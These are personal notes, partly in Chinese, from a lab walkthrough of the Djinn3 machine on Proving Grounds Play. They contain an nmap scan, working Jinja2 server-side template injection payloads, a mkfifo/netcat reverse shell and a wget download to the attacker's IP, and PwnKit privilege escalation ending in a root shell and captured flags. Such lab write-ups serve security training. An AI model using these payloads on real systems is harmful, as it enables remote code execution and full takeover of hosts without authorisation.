参考资料
    
[https://medium.com/@spAce0x/djinn-3-pg-play-write-up-dab19749c5e4](https://medium.com/@spAce0x/djinn-3-pg-play-write-up-dab19749c5e4)  
[https://github.com/thevillagehacker/Proving_Grounds/blob/main/Writeups/2023-07-29-Proving_grounds_Play-Djinn3.md](https://github.com/thevillagehacker/Proving_Grounds/blob/main/Writeups/2023-07-29-Proving_grounds_Play-Djinn3.md)
 
[https://medium.com/@rizzziom/djinn-3-walkthrough-proving-grounds-4e4afaf9d614](https://medium.com/@rizzziom/djinn-3-walkthrough-proving-grounds-4e4afaf9d614)
         

扫描  
Nmap 7.95 scan initiated Fri Nov 7 23:47:05 2025 as: /usr/lib/nmap/nmap --privileged -A -p- -oN djinn.nmap --min-rate 10000 192.168.146.102  
Warning: 192.168.146.102 giving up on port because retransmission cap hit (10).  
Nmap scan report for 192.168.146.102  
Host is up (0.084s latency).  
Not shown: 65528 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)  
| 256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)  
|_ 256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)  
80/tcp open http lighttpd 1.4.45  
|_http-server-header: lighttpd/1.4.45  
|_http-title: Custom-ers  
5000/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9)  
|_http-title: Site doesn't have a title (text/html; charset=utf-8).  
21532/tcp filtered unknown  
23632/tcp filtered unknown  
31337/tcp open Elite?  
| fingerprint-strings:  
| DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL:  
| username\>  
| GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:  
| username\> password\> authentication failed  
| Help:  
| username\> password\>  
| RPCCheck:  
| username\> Traceback (most recent call last):  
| File "/opt/.tick-serv/tickets.py", line 105, in \<module\>  
| main()  
| File "/opt/.tick-serv/tickets.py", line 93, in main  
| username = input("username\> ")  
| File "/usr/lib/python3.6/codecs.py", line 321, in decode  
| (result, consumed) = self._buffer_decode(data, self.errors, final)  
| UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte  
| SSLSessionReq:  
| username\> Traceback (most recent call last):  
| File "/opt/.tick-serv/tickets.py", line 105, in \<module\>  
| main()  
| File "/opt/.tick-serv/tickets.py", line 93, in main  
| username = input("username\> ")  
| File "/usr/lib/python3.6/codecs.py", line 321, in decode  
| (result, consumed) = self._buffer_decode(data, self.errors, final)  
| UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte  
| TerminalServerCookie:  
| username\> Traceback (most recent call last):  
| File "/opt/.tick-serv/tickets.py", line 105, in \<module\>  
| main()  
| File "/opt/.tick-serv/tickets.py", line 93, in main  
| username = input("username\> ")  
| File "/usr/lib/python3.6/codecs.py", line 321, in decode  
| (result, consumed) = self._buffer_decode(data, self.errors, final)  
|_ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte  
65177/tcp filtered unknown
   

提权扫描  
find / -perm -u=s ==2==\>==/dev/====null==
 
[http://192.168.146.102:5000/](http://192.168.146.102:5000/)
 
[http://192.168.146.102:5000/?id=4567](http://192.168.146.102:5000/?id=4567)
    
测试方法：第一种 没有成功
 
{{config.__class__.__init__.__globals__['ls'].popen('ls').read()}}
    
{{config.__class__.__init__.__globals__['os'].popen('wget [http://192.168.45.235:8000/rev3.py](http://192.168.45.235:8000/rev3.py) -O /vat/tmp/rev3.py').read()}}
 
rev shell
 
{{config.__class__.__init__.__globals__['os'].popen('python /var/tmp/rev3.py').read()}}  
{{config.__class__.__init__.__globals__['os'].popen('python /var/tmp/rev3.py'),read()}}
   

测试方法：第二种
 
fileaccess  
{{''.__class__.__mro__[1].__subclasses__()}}
   

demo  
{{cycler.__init__.__globals__.os.popen('id').read()}}
   

反向shell  
revshell  
{{cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\>&1|nc 192.168.45.235 1234 \>/tmp/f').read()}}
 
nc -lvpn 1234
      

diyige  
a4c4c2e8c01179472eee391b90c46e6e
   

dierge  
14ba06093320bc315a59250b5e87632e
   

提权脚本 wget [https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh](https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh)  
mv PwnKit.sh 1.sh
    
www  
$ cd /tmp  
$ ls  
f  
netplan_pcbd9b69  
netplan_q6eowpje  
systemd-private-4fd42dd7e0824bf0bc054a891d127ca6-systemd-resolved.service-CndKII  
systemd-private-4fd42dd7e0824bf0bc054a891d127ca6-systemd-timesyncd.service-q2iLRW  
vmware-root_686-2689274894  
$ wget [http://192.168.45.235:8000/1.sh](http://192.168.45.235:8000/1.sh)  
--2025-11-08 11:09:49-- [http://192.168.45.235:8000/1.sh](http://192.168.45.235:8000/1.sh)  
Connecting to 192.168.45.235:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 18040 (18K) [text/x-sh]  
Saving to: ‘1.sh’
 
0K .......... ....... 100% 213K=0.08s
 
2025-11-08 11:09:49 (213 KB/s) - ‘1.sh’ saved [18040/18040]
 
$ ls  
1.sh  
f  
netplan_pcbd9b69  
netplan_q6eowpje  
systemd-private-4fd42dd7e0824bf0bc054a891d127ca6-systemd-resolved.service-CndKII  
systemd-private-4fd42dd7e0824bf0bc054a891d127ca6-systemd-timesyncd.service-q2iLRW  
vmware-root_686-2689274894  
$ chmod +x 1.sh  
$ ./1.sh  
mesg: ttyname failed: Inappropriate ioctl for device  
id  
uid=0(root) gid=0(root) groups=0(root),33(www-data)  
whoami  
root  
cd /root  
ls  
proof.txt  
cat proof.txt  
14ba06093320bc315a59250b5e87632e  
whoami  
root